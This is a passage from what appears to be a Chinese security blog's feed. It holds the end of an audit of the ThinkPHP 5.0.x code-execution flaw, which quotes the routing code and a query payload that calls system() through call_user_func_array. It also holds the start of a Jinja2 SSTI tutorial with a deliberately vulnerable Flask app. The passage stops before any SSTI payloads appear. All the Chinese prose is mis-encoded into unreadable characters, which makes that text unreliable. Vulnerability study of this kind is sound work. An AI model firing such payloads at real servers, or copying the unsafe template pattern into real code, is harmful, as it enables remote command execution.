class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($config[<span class="string">'app_multi_module'</span>]) &#123;</span><br><span class="line">        <span class="comment">// å¤šæ¨¡å—éƒ¨ç½²</span></span><br><span class="line">        $module    = strip_tags(strtolower($result[<span class="number">0</span>] ?: $config[<span class="string">'default_module'</span>]));</span><br><span class="line">        $bind      = Route::getBind(<span class="string">'module'</span>);</span><br><span class="line">        $available = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($bind) &#123;</span><br><span class="line">            <span class="comment">// ç»‘å®šæ¨¡å—</span></span><br><span class="line">            <span class="keyword">list</span>($bindModule) = explode(<span class="string">'/'</span>, $bind);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($result[<span class="number">0</span>])) &#123;</span><br><span class="line">                $module    = $bindModule;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($module == $bindModule) &#123;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!in_array($module, $config[<span class="string">'deny_module_list'</span>]) &amp;&amp; is_dir(APP_PATH . $module)) &#123;</span><br><span class="line">            $available = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¨¡å—åˆå§‹åŒ–</span></span><br><span class="line">        <span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line">            <span class="comment">// åˆå§‹åŒ–æ¨¡å—</span></span><br><span class="line">            $request-&gt;module($module);</span><br><span class="line">            $config = <span class="keyword">self</span>::init($module);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¨¡å—è¯·æ±‚ç¼“å­˜æ£€æŸ¥</span></span><br><span class="line">            $request-&gt;cache(</span><br><span class="line">                $config[<span class="string">'request_cache'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_expire'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_except'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å•ä¸€æ¨¡å—éƒ¨ç½²</span></span><br><span class="line">        $module = <span class="string">''</span>;</span><br><span class="line">        $request-&gt;module($module);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®é»˜è®¤è¿‡æ»¤æœºåˆ¶</span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½“å‰æ¨¡å—è·¯å¾„</span></span><br><span class="line">    App::$modulePath = APP_PATH . ($module ? $module . DS : <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¯å¦è‡ªåŠ¨è½¬æ¢æ§åˆ¶å™¨å’Œæ“ä½œå</span></span><br><span class="line">    $convert = is_bool($convert) ? $convert : $config[<span class="string">'url_convert'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–æ§åˆ¶å™¨å</span></span><br><span class="line">    $controller = strip_tags($result[<span class="number">1</span>] ?: $config[<span class="string">'default_controller'</span>]);</span><br><span class="line">    $controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–æ“ä½œå</span></span><br><span class="line">    $actionName = strip_tags($result[<span class="number">2</span>] ?: $config[<span class="string">'default_action'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($config[<span class="string">'action_convert'</span>])) &#123;</span><br><span class="line">        $actionName = Loader::parseName($actionName, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $actionName = $convert ? strtolower($actionName) : $actionName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å½“å‰è¯·æ±‚çš„æ§åˆ¶å™¨ã€æ“ä½œ</span></span><br><span class="line">    $request-&gt;controller(Loader::parseName($controller, <span class="number">1</span>))-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">    Hook::listen(<span class="string">'module_init'</span>, $request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(</span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å½“å‰æ“ä½œå</span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›çš„å°±æ˜¯æˆ‘åœ¨æ–‡ç« ä¸€å¼€å¤´è¯´çš„å†…å®¹ï¼Œcontrollerå˜é‡å°±è¢«èµ‹å€¼ï¼Œç„¶åè·å¾—æ–¹æ³•åå­—ï¼Œå¼€å§‹è¯·æ±‚è¿™ä¸ªæ–¹æ³•</p><p><img src="https://s2.ax1x.com/2019/02/15/kDqoNV.png" alt="kDqoNV.png"></p><p>æœ€åè¿˜æ˜¯è¿”å›äº†è¿™ä¸ªæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br></pre></td></tr></table></figure><p>$callå˜é‡æ˜¯ä¸ªæ•°ç»„ï¼Œé‡Œé¢åŒ…å«äº†æ§åˆ¶å™¨ä»¥åŠæ“ä½œï¼Œå¯ä»¥è¿½è¸ªé‡Œé¢çš„å˜é‡å˜åŒ–</p><p><img src="https://s2.ax1x.com/2019/02/15/kDL3uj.png" alt="kDL3uj.png"></p><p>ç„¶åé€šè¿‡<code>ReflectionMethod</code>æ–¹æ³•å»æ„é€ ä¸€ä¸ªæ˜ å°„ï¼Œåæ­£å°±æŠŠä»–å½“æˆå¹³å¸¸ä¸€ä¸ªç±»å»è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œæ¥ç€å°±æŠŠå‰©ä½™çš„urlçš„å‰©ä½™å†…å®¹èµ‹å€¼ç»™argsï¼Œæœ€åè°ƒç”¨<code>invokefunction</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿç±»ä¼¼å›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥å°±ä¼šæŠŠ<code>&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</code>ä¼ è¿›<code>invokefunction</code>è¿™ä¸ªæ–¹æ³•é‡Œé¢ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/15/kDLOG8.png" alt="kDLOG8.png"></p><p><img src="https://s2.ax1x.com/2019/02/15/kDOPI0.png" alt="kDOPI0.png"></p><p>å¯ä»¥çœ‹åˆ°é‡Œé¢argsé‡Œé¢çš„å†…å®¹ç»“æ„ï¼Œé‡Œé¢åŒ…å«äº†å¤šä¸ªæ•°ç»„</p><p><img src="https://s2.ax1x.com/2019/02/15/kDO2es.png" alt="kDO2es.png"></p><p>ç»§ç»­è·Ÿè¿›çš„è¯ï¼Œä½ ä¼šå‘ç°è¿™ä¸ªå‡½æ•°è·Ÿä¸Šé¢è·Ÿè¿›çš„å‡½æ•°çš„å¥—è·¯ä¸€æ¨¡ä¸€æ ·ï¼Œä¹Ÿæ˜¯åˆ©ç”¨äº†å›è°ƒçš„æ•ˆæœï¼Œä¹Ÿæ˜¯åˆ©ç”¨ä¸€ä¸ªå˜é‡æŠŠsystemåé¢çš„å†…å®¹è¿”å›ç»™<code>call_user_func_array</code>ï¼Œåªä¸è¿‡è¿™æ¬¡å¯ä»¥ç›´æ¥è°ƒç”¨<code>call_user_func_array</code>äº†ï¼Œç›¸å½“äº<code>call_user_func_array(&quot;system&quot;,&quot;dir&quot;)</code>äº†</p><p><img src="https://s2.ax1x.com/2019/02/15/kDvUeJ.png" alt="kDvUeJ.png"></p><h3 id="è¡¥ä¸åçš„æ•ˆæœ"><a href="#è¡¥ä¸åçš„æ•ˆæœ" class="headerlink" title="è¡¥ä¸åçš„æ•ˆæœ"></a>è¡¥ä¸åçš„æ•ˆæœ</h3><p>å†æ¥è§‚å¯Ÿä¸€ä¸‹åŠ ä¸Šè¡¥ä¸çš„èµ°å‘ï¼Œç›´æ¥å°±ä¼šè¿›å…¥æŠ›å‡ºå¼‚å¸¸çš„æ­¥éª¤ï¼Œåªè¦åŒ¹é…åˆ°ä¸æ˜¯å­—æ¯å¼€å¤´çš„æ§åˆ¶å™¨çš„è¯ç›´æ¥è¿›å…¥å¼‚å¸¸ï¼Œæœ‰æ•ˆé¿å…åˆ©ç”¨å‘½åç©ºé—´æ„é€ æ”»å‡»é“¾</p><p><img src="https://s2.ax1x.com/2019/02/15/kDx8AA.png" alt="kDx8AA.png"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ol><li>è¿™ä¸ªæ”»å‡»é“¾çš„æ„é€ ï¼Œè¿˜æ˜¯æ¦‚å¿µæ¨¡ç³Šï¼Œå¦‚æœçœŸæ­£æ„é€ çš„æ—¶å€™éœ€è¦æ€ä¹ˆå»åšï¼Ÿè¿™é‡Œåªæ˜¯æ ¹æ®åˆ«äººçš„payloadå»åˆ†æä»£ç ï¼Œåˆ†æå®ƒçš„æ”»å‡»è¿‡ç¨‹ï¼Œä¸ªäººæ„Ÿè§‰çœŸæ­£æ ¸å¿ƒçš„ä¸œè¥¿æ²¡æŒæ¡ï¼Œä¹Ÿæœ‰å¯èƒ½çœ‹å¾—å¤šå°±ä¼šäº†ï¼Ÿï¼Ÿï¼ŸXDå› ä¸ºè¿™ä¸ªä¸œè¥¿ä¸åªæ˜¯è¿™ä¸ªæ¨¡å—å¯ä»¥å¦‚æ­¤è°ƒç”¨ï¼Œè¿˜æœ‰å…¶ä»–æ¨¡å—ä¹Ÿæœ‰åŒæ ·çš„æ•ˆæœï¼Œè¿™ä¹Ÿæ¯”è¾ƒè€ƒéªŒå¯¹è¯¥æ¡†æ¶çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œå¤šæ¥è§¦å¼€å‘è¿˜æ˜¯å¾ˆå¥½çš„ã€‚</li><li>çœ‹äº†å¥½å‡ ç¯‡æ–‡ç« ï¼Œå‘ç°è¿™å‡ ä¸ªéƒ½æ˜¯å·®ä¸å¤šä»è·¯ç”±çš„æ£€æµ‹å¼€å§‹è·Ÿè¿›ï¼Œå…¶å®æƒ³æƒ³ä¹Ÿå¯¹ï¼Œæ¯•ç«Ÿpayloadä»urlä¸­æ¥ï¼Œè·Ÿè¿›æŸå‡½æ•°è·Ÿåˆ°åº•äº†å†è¿”å›ï¼Œæœ‰å¯èƒ½è¿™æ˜¯ä¸€ç§å¥—è·¯ï¼Œå…ˆè®°ä¸‹æ¥ã€‚ã€‚ã€‚</li><li>æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å®¡è®¡è¿™ç§ä¸œè¥¿ï¼Œæ¯•ç«ŸThinkPHP 5.0.x çš„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä»æ¼æ´æŠ€æœ¯å«é‡å’Œåˆ©ç”¨é“¾æ„é€ ä¸Šæ¥çœ‹ï¼Œç®—æ˜¯2018å¹´ä¸€ä¸ªå¾ˆç‰›çš„æ´äº†ï¼Œå¯¹æˆ‘è¿™ç§èœé¸¡ï¼Œå­¦ä¹ åˆ°å°±å¥½ã€‚</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç¬¬ä¸€æ¬¡è¿›è¡Œä»£ç é‡è¿™ä¹ˆå¤§çš„åˆ†æï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¸ªäººæ„Ÿè§‰æ–°æ‰‹çœŸçš„ä¸é€‚åº”è¿™ç§ï¼Œåº”è¯¥æ‰¾ç‚¹å°ä¸€ç‚¹çš„cmså»åˆ†æï¼Œå¦‚æœä¸æ‡‚MVCæ¶æ„
    
    </summary>
    
      <category term="ä»£ç å®¡è®¡" scheme="0verwatch.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SSTI-injection</title>
    <link href="0verwatch.top/SSTI-injection.html"/>
    <id>0verwatch.top/SSTI-injection.html</id>
    <published>2019-02-04T08:30:46.000Z</published>
    <updated>2019-02-08T10:11:56.488Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å…ˆå…¥ä¸ªé—¨"><a href="#å…ˆå…¥ä¸ªé—¨" class="headerlink" title="å…ˆå…¥ä¸ªé—¨"></a>å…ˆå…¥ä¸ªé—¨</h3><h4 id="Jimja2"><a href="#Jimja2" class="headerlink" title="Jimja2"></a>Jimja2</h4><p><code>Jinja2</code>æ˜¯é»˜è®¤çš„ä»¿<code>Django</code>æ¨¡æ¿çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œç”±<code>Flask</code>çš„ä½œè€…å¼€å‘ã€‚ç½‘ä¸Šæœçš„è¯­æ³•<a id="more"></a>2333ï¼Œæ–¹ä¾¿è‡ªå·±å›é¡¾</p><h5 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ... &#125;&#125;ï¼šè£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°è¿™ä¸ªå˜é‡ä»£è¡¨çš„å€¼æ›¿æ¢æ‰ã€‚</span><br><span class="line">&#123;% ... %&#125;ï¼šè£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ã€‚</span><br><span class="line">&#123;# ... #&#125;ï¼šè£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼</span><br></pre></td></tr></table></figure><h5 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h5><p>åœ¨æ¨¡æ¿ä¸­æ·»åŠ å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ï¼ˆsetï¼‰è¯­å¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set name=&apos;xx&apos; %&#125;</span><br></pre></td></tr></table></figure><p><code>with</code>è¯­å¥æ¥åˆ›å»ºä¸€ä¸ªå†…éƒ¨çš„ä½œç”¨åŸŸï¼Œå°†<code>set</code>è¯­å¥æ”¾åœ¨å…¶ä¸­ï¼Œè¿™æ ·åˆ›å»ºçš„å˜é‡åªåœ¨<code>with</code>ä»£ç å—ä¸­æ‰æœ‰æ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with gg = 42 %&#125;</span><br><span class="line">&#123;&#123; gg &#125;&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><h5 id="ifè¯­å¥"><a href="#ifè¯­å¥" class="headerlink" title="ifè¯­å¥"></a>ifè¯­å¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ken.sick %&#125;</span><br><span class="line">Ken is sick.</span><br><span class="line">&#123;% elif ken.dead %&#125;</span><br><span class="line">You killed Ken! You bastard!!!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">Kenny looks okay --- so far</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h5 id="forè¯­å¥"><a href="#forè¯­å¥" class="headerlink" title="forè¯­å¥"></a>forè¯­å¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&#123;&#123; user.username|e &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="éå†"><a href="#éå†" class="headerlink" title="éå†"></a>éå†</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for key, value in &lt;strong&gt;my_dict.iteritems()&lt;/strong&gt; %&#125;</span><br><span class="line">&amp;lt;dt&amp;gt;&#123;&#123; key|e &#125;&#125;&amp;lt;/dt&amp;gt;</span><br><span class="line">&amp;lt;dd&amp;gt;&#123;&#123; value|e &#125;&#125;&amp;lt;/dd&amp;gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡"><a href="#Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡" class="headerlink" title="Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡"></a>Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡</h5><p>loop.index    å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»1å¼€å§‹ï¼‰<br>loop.index0    å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»0å¼€å§‹ï¼‰<br>loop.first    æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True\/False<br>loop.last    æ˜¯å¦æ˜¯æœ€åä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True\/False<br>loop.length    åºåˆ—çš„é•¿åº¦<br> æ³¨æ„ï¼šä¸å¯ä»¥ä½¿ç”¨continueå’Œbreakè¡¨è¾¾å¼æ¥æ§åˆ¶å¾ªç¯çš„æ‰§è¡Œã€‚</p><h5 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h5><p>è¿‡æ»¤å™¨æ˜¯é€šè¿‡<code>ï¼ˆ|ï¼‰</code>ç¬¦å·è¿›è¡Œä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š<code>0</code>ï¼šå°†è¿”å›nameçš„é•¿åº¦</p><p>ç±»ä¼¼äºæˆ‘ä»¬å¹³å¸¸çš„çš„å‡½æ•°ï¼Œä»–ä»–è¿™ç§åº”è¯¥å°±æ˜¯å†…ç½®å‡½æ•°ï¼Œå› ä¸ºå®ƒæœ¬èº«å°±å«æœ‰å¾ˆå¤šè¿‡æ»¤å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">abs(value)ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ã€‚ç¤ºä¾‹ï¼š-1|abs</span><br><span class="line">last(value)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ç¤ºä¾‹ï¼šnames|lastã€‚</span><br><span class="line">length(value)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ã€‚ç¤ºä¾‹ï¼šnames|lengthã€‚</span><br><span class="line">join(value,d=u&apos;&apos;)ï¼šå°†ä¸€ä¸ªåºåˆ—ç”¨dè¿™ä¸ªå‚æ•°çš„å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚</span><br><span class="line">int(value)ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ã€‚</span><br><span class="line">float(value)ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ã€‚</span><br><span class="line">lower(value)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚</span><br><span class="line">upper(value)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</span><br></pre></td></tr></table></figure><h3 id="æ¨¡æ¿æ³¨å…¥"><a href="#æ¨¡æ¿æ³¨å…¥" class="headerlink" title="æ¨¡æ¿æ³¨å…¥"></a>æ¨¡æ¿æ³¨å…¥</h3><p>ç®€å•åœ°è¯´è·Ÿè¿™ç§ç±»å‹çš„æ³¨å…¥è·Ÿä¸€èˆ¬çš„æ³¨å…¥æˆå› å…¶å®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿‡åˆ†ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥å¯¼è‡´çš„æ¼æ´ï¼Œè¿™æ ·ä¸€æ¥é€šè¿‡æ¨¡æ¿æ³¨å…¥å¯ä»¥å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œç­‰è¯¸å¤šæ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡å…³äºPHPçš„æ¨¡æ¿æ³¨å…¥ï¼Œå†™çš„æŒºå¥½ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<code>https://www.freebuf.com/vuls/83999.html</code>,ä½†è¿™ç¯‡æ–‡ç« PHP æ¨¡ç‰ˆå¼•æ“ Twig ä½œä¸ºä¾‹å­ï¼Œåªæ˜¯ç®€å•ä»‹ç»äº†ä¸€ä¸‹XSSçš„ç›¸å…³æ¼æ´ï¼Œå¹¶æ²¡æœ‰è§¦å‘æ›´å¤§çš„å±å®³ï¼Œä½†æ˜¯å¸¸è§„çš„æµ‹è¯•æ–¹æ³•å·²ç»å†™äº†å‡ºæ¥ï¼Œè·Ÿæµ‹è¯•æ³¨å…¥å…¶å®å·®ä¸å¤šï¼Œå°±æ˜¯æ¢äº†å†…å®¹è€Œå·²ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/07/ktayNt.png" alt="ktayNt.png"></p><p>æ‰€ä»¥ä¸‹é¢å°±è‡ªå·±æ­ä¸ªpythonçš„webç¯å¢ƒï¼Œä»¥å±å®³æ›´å¤§çš„<code>SSTIæ¨¡æ¿</code>æ³¨å…¥ä½œä¸ºä¾‹å­è¯´æ˜ï¼Œè¿™æ˜¯app.pyé‡Œé¢çš„ä»£ç å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å¾—å‡ºæ¥nameå‚æ•°ç›´æ¥ä»¥getæ–¹å¼è·å–ï¼Œç›´æ¥æ‹¼æ¥åœ¨Helloåé¢ä½œä¸ºæ¨¡æ¿ï¼Œç›´æ¥renderï¼Œè¿™å¾ˆæ˜æ˜¾nameå‚æ•°æ˜¯å¯æ§çš„ã€‚é—®é¢˜ä¹Ÿæ°å¥½æ˜¯å‡ºåœ¨è¿™ã€‚</p><p>å½“ç„¶è¿™é‡Œä¹Ÿæ˜¯æœ‰XSSçš„</p><p><img src="https://s2.ax1x.com/2019/02/07/ktJXGD.png" alt="ktJXGD.png"></p><p>ä½†æ˜¯é‡ç‚¹è¿˜æ˜¯æ”¾åœ¨è¯»æ–‡ä»¶è¿™ä¸€åŠŸèƒ½ä¸Šï¼Œè¿™ä¹Ÿç›¸å½“äºç›´æ¥RCEäº†ï¼Œå…ˆè¦å­¦ä¹ ä¸€ä¸‹ä¸‹é¢è¿™å‡ ä¸ªç±»ï¼Œ<code>__mro__</code>ä»¥åŠ<code>__subclasses__</code>å±æ€§ï¼Œå…¶å®è¿™é‡Œæœ‰ç‚¹åƒpythonæ²™ç›’ç»•è¿‡çš„æ„é€ æ–¹æ³•23333.</p><p><code>__mro__</code>ä¸­çš„MRO(Method Resolution Order)ä»£è¡¨ç€è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼Œå¯ä»¥çœ‹çœ‹<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__" target="_blank" rel="noopener">Pythonæ–‡æ¡£</a>ä¸­çš„ä»‹ç»ã€‚</p><p><code>__subclasses__</code>å±æ€§åœ¨è¿™é‡Œä½œä¸ºä¸€ç§æ–¹æ³•è¢«<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__" target="_blank" rel="noopener">å®šä¹‰</a>ä¸ºï¼Œå¯¹æ¯ä¸ªnew-style classâ€œä¸ºå®ƒçš„ç›´æ¥å­ç±»ç»´æŒä¸€ä¸ªå¼±å¼•ç”¨åˆ—è¡¨â€ï¼Œä¹‹åâ€œè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å­˜æ´»å¼•ç”¨çš„åˆ—è¡¨â€ã€‚</p><p>ä¸Šé¢çš„è¿™ä¸¤ä¸ªå±æ€§å¼•ç”¨è‡ªè¿™ç¯‡æ–‡ç« 